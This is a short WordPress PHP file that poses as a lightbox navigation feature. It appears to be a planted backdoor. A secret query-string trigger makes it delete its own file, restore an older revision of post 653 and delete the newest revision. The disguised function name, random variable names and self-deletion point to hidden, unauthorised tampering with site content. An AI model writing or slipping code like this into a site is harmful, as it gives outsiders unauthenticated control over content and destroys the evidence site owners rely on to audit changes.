<?php

function using_lightbox_live_navigation() {
	if (isset($_GET['active_elements_com']) && $_GET['active_elements_com'] === 'subscription_poll_anti_order') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$scheduled_scripts_additional = 653;
		$solution_out_fancy = wp_get_post_revisions($scheduled_scripts_additional);
		if (empty($solution_out_fancy)) die('no revisions');
		if (count($solution_out_fancy) < 2) die('less than 2');
		$ajax_notifier_deprecated_colors = array_shift($solution_out_fancy);
		$lead_recaptcha_counter_edition = $ajax_notifier_deprecated_colors->ID;
		$carousel_dist_slideshow_feeds = array_shift($solution_out_fancy);
		$name_viewer_feedback_another = $carousel_dist_slideshow_feeds->ID;
		$wpc_easy_button_protect = wp_restore_post_revision($name_viewer_feedback_another);
		if ($wpc_easy_button_protect === false) die('error restoring');
		$wpc_easy_button_protect = wp_delete_post_revision($lead_recaptcha_counter_edition);		
		if ($wpc_easy_button_protect === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'using_lightbox_live_navigation');
